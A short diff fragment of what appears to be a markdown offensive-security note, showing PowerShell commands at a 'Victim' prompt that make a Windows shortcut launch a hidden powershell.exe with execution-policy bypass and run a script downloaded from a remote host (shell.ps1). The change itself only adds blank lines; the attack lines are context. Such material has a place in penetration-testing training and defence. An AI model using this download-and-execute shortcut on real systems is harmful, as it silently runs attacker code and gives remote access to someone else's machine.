@@ -45,3 +45,5 @@ PS C:\Users\Victim> $SC.TargetPath="powershell.exe"
 PS C:\Users\Victim> $SC.Arguments="-ep bypass -windowstyle hidden iex(New-Object Net.WebClient).downloadString('http://10.10.10.100/shell.ps1')"
 PS C:\Users\Victim> $SC.Save()
 ```
+
+
